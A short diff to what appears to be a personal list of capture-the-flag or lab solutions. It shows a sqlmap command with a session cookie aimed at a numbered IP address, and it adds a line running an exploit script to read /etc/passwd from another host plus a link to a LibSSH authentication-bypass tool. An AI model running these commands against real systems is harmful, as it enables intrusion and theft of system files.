@@ -24,7 +24,8 @@
 9 schematick sqlmap -u http://34.159.62.179:32027/index.php  --cookie="PHPSESSID=e40e1c0f2baba9b6b6d07033355f0819" --forms --columns
 
 
-
+10 elastic python exploit.py http://35.198.97.185:31763/ /etc/passwd
+11 libshh  https://github.com/nikhil1232/LibSSH-Authentication-Bypass
 
 
 
